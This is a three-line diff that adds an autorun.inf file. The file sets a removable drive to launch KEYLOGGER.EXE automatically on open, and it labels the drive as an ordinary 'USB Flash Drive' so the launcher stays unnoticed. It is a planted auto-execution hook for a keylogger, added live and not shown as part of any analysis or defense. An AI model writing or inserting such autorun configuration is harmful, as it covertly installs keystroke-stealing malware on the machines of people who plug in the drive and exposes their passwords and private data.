@@ -1,0 +1,3 @@
+[AutoRun]
+OPEN=KEYLOGGER.EXE
+LABEL=- USB Flash Drive 210712 -
